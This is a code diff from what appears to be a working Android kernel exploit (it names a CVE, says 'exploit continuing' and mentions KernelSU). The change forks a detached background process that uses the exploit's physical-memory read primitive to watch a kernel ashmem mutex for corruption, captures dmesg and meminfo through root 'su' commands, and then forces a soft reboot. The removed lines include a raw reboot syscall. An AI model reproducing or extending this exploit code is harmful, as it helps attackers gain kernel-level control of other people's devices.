@@ -992,89 +992,93 @@ int try_cfi_stage(void) {
 
 #if defined(ASHMEM_MUTEX_OFF)
   if (getenv("DIAG_SOFT_REBOOT")) {
-    pr_info("diag-reboot: === DIAGNOSTIC SOFT REBOOT MODE ===\n");
-    pr_info("diag-reboot: keeping configfs fd open for mutex monitoring\n");
-    pr_info("diag-reboot: mutex_direct=%016zx\n", data_addr(ASHMEM_MUTEX));
-
-    pr_info("diag-reboot: waiting 5s for root helper + KernelSU to load...\n");
+    uintptr_t diag_mutex_addr = data_addr(ASHMEM_MUTEX);
+    pr_info("diag-reboot: forking background diagnostic process "
+            "mutex_direct=%016zx\n", diag_mutex_addr);
     fflush(NULL);
-    sleep(5);
+    pid_t diag_child = fork();
+    if (diag_child == 0) {
+      syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
+      syscall(SYS_prctl, PR_SET_NAME, "cve43499-diag", 0, 0, 0);
+      syscall(SYS_setsid);
 
-    uint8_t mutex_snap[MUTEX_SIZE];
-    for (int tick = 0; tick < 20; tick++) {
+      pr_info("diag-reboot: === DIAGNOSTIC BACKGROUND PROCESS pid=%d ===\n",
+              getpid());
+      pr_info("diag-reboot: waiting 45s for root + KernelSU to fully load...\n");
+      fflush(NULL);
+      for (int wait = 0; wait < 45; wait++) {
+        sleep(1);
+        if (wait % 10 == 9) {
+          uint8_t snap[MUTEX_SIZE];
+          memset(snap, 0xCC, sizeof(snap));
+          int rok = pipe_phys_read_data(fd, diag_mutex_addr, snap, MUTEX_SIZE);
+          uint32_t wl = 0;
+          if (rok) memcpy(&wl, snap + MUTEX_WAITLOCK_OFF, 4);
+          pr_info("diag-reboot: wait T+%02d read=%d wait_lock=%08x\n",
+                  wait + 1, rok, wl);
+          fflush(NULL);
+        }
+      }
+
+      pr_info("diag-reboot: === monitoring mutex every second for 30s ===\n");
+      fflush(NULL);
+      uint8_t mutex_snap[MUTEX_SIZE];
+      for (int tick = 0; tick < 30; tick++) {
+        memset(mutex_snap, 0xCC, sizeof(mutex_snap));
+        int read_ok = pipe_phys_read_data(
+            fd, diag_mutex_addr, mutex_snap, MUTEX_SIZE);
+        uint32_t wait_lock = 0, osq = 0;
+        uint64_t owner = 0, wl_next = 0;
+        if (read_ok) {
+          memcpy(&owner, mutex_snap + MUTEX_OWNER_OFF, 8);
+          memcpy(&wait_lock, mutex_snap + MUTEX_WAITLOCK_OFF, 4);
+          memcpy(&osq, mutex_snap + MUTEX_OSQ_OFF, 4);
+          memcpy(&wl_next, mutex_snap + MUTEX_WAITLIST_OFF, 8);
+        }
+        pr_info("diag-reboot: T+%02d read=%d owner=%016llx wait_lock=%08x "
+                "osq=%08x wl_next=%016llx\n",
+                tick, read_ok,
+                (unsigned long long)owner, wait_lock, osq,
+                (unsigned long long)wl_next);
+        if (read_ok && (wait_lock != 0 || osq != 0)) {
+          dump_hex("diag-reboot CORRUPT-MUTEX", mutex_snap, MUTEX_SIZE);
+          pr_warning("diag-reboot: CORRUPTION DETECTED at T+%d!\n", tick);
+        }
+        fflush(NULL);
+        sleep(1);
+      }
+
+      pr_info("diag-reboot: === capturing diagnostics ===\n");
+      fflush(NULL);
+      system("su -c 'dmesg > /data/local/tmp/diag-dmesg-pre-reboot.txt' 2>/dev/null");
+      system("su -c 'cat /proc/meminfo > /data/local/tmp/diag-meminfo.txt' 2>/dev/null");
+      system("su -c 'dmesg | grep -iE \"BUG|bad page|refcount|corrupt\" > /data/local/tmp/diag-anomalies.txt' 2>/dev/null");
+
+      pr_info("diag-reboot: === final mutex snapshot ===\n");
       memset(mutex_snap, 0xCC, sizeof(mutex_snap));
-      int read_ok = pipe_phys_read_data(
-          fd, data_addr(ASHMEM_MUTEX), mutex_snap, MUTEX_SIZE);
-      uint32_t wait_lock = 0;
-      uint32_t osq = 0;
-      uint64_t owner = 0;
-      uint64_t wl_next = 0;
-      if (read_ok) {
-        memcpy(&owner, mutex_snap + MUTEX_OWNER_OFF, 8);
-        memcpy(&wait_lock, mutex_snap + MUTEX_WAITLOCK_OFF, 4);
-        memcpy(&osq, mutex_snap + MUTEX_OSQ_OFF, 4);
-        memcpy(&wl_next, mutex_snap + MUTEX_WAITLIST_OFF, 8);
-      }
-      pr_info("diag-reboot: T+%02d read=%d owner=%016llx wait_lock=%08x "
-              "osq=%08x wl_next=%016llx\n",
-              tick, read_ok,
-              (unsigned long long)owner, wait_lock, osq,
-              (unsigned long long)wl_next);
-      if (read_ok) {
-        dump_hex("diag-reboot mutex-raw", mutex_snap, MUTEX_SIZE);
-      }
-      if (wait_lock != 0 || osq != 0 ||
-          (owner != 0 && !is_kernel_ptr(owner)) ||
-          (wl_next != 0 && !is_kernel_ptr(wl_next))) {
-        pr_warning("diag-reboot: CORRUPTION DETECTED at T+%d! "
-                   "wait_lock=%08x osq=%08x owner=%016llx wl_next=%016llx\n",
-                   tick, wait_lock, osq,
-                   (unsigned long long)owner, (unsigned long long)wl_next);
+      int final_ok = pipe_phys_read_data(
+          fd, diag_mutex_addr, mutex_snap, MUTEX_SIZE);
+      if (final_ok) {
+        dump_hex("diag-reboot FINAL-MUTEX", mutex_snap, MUTEX_SIZE);
+        uint32_t final_wl = 0;
+        memcpy(&final_wl, mutex_snap + MUTEX_WAITLOCK_OFF, 4);
+        pr_info("diag-reboot: FINAL wait_lock=%08x %s\n",
+                final_wl, final_wl == 0 ? "CLEAN" : "CORRUPT");
       }
       fflush(NULL);
+      sync();
       sleep(1);
+
+      pr_info("diag-reboot: === TRIGGERING SOFT REBOOT ===\n");
+      fflush(NULL);
+      system("su -c 'svc power reboot soft_reboot'");
+      sleep(10);
+      system("su -c 'reboot soft_reboot'");
+      sleep(30);
+      _exit(0);
     }
-
-    pr_info("diag-reboot: === 20s monitoring complete, capturing dmesg ===\n");
-    fflush(NULL);
-    system("su -c 'dmesg > /data/local/tmp/diag-dmesg-pre-reboot.txt' 2>/dev/null");
-    system("su -c 'cat /proc/meminfo > /data/local/tmp/diag-meminfo-pre-reboot.txt' 2>/dev/null");
-    system("su -c 'ps -A > /data/local/tmp/diag-processes-pre-reboot.txt' 2>/dev/null");
-    system("su -c 'dmesg | grep -iE \"BUG|bad page|refcount|corrupt\" > /data/local/tmp/diag-anomalies.txt' 2>/dev/null");
-
-    pr_info("diag-reboot: === final mutex snapshot before reboot ===\n");
-    memset(mutex_snap, 0xCC, sizeof(mutex_snap));
-    int final_ok = pipe_phys_read_data(
-        fd, data_addr(ASHMEM_MUTEX), mutex_snap, MUTEX_SIZE);
-    if (final_ok) {
-      dump_hex("diag-reboot FINAL-MUTEX", mutex_snap, MUTEX_SIZE);
-      uint32_t final_wl = 0;
-      memcpy(&final_wl, mutex_snap + MUTEX_WAITLOCK_OFF, 4);
-      if (final_wl != 0) {
-        pr_warning("diag-reboot: FINAL wait_lock=%08x IS CORRUPT\n", final_wl);
-      } else {
-        pr_success("diag-reboot: FINAL wait_lock=0 (CLEAN)\n");
-      }
-    } else {
-      pr_warning("diag-reboot: FINAL mutex read FAILED\n");
-    }
-
-    fflush(NULL);
-    sync();
-    sleep(1);
-
-    pr_info("diag-reboot: === TRIGGERING SOFT REBOOT NOW ===\n");
-    fflush(NULL);
-
-    system("su -c 'svc power reboot soft_reboot'");
-
-    sleep(5);
-    pr_warning("diag-reboot: soft reboot command returned — trying reboot syscall\n");
-    fflush(NULL);
-    syscall(SYS_reboot, 0xfee1dead, 0x28121969, 0xA1B2C3D4, "soft_reboot");
-    sleep(30);
-    pr_error("diag-reboot: all reboot methods failed\n");
-    fflush(NULL);
+    pr_info("diag-reboot: background diagnostic pid=%d — exploit continuing\n",
+            diag_child);
   }
 #endif
 
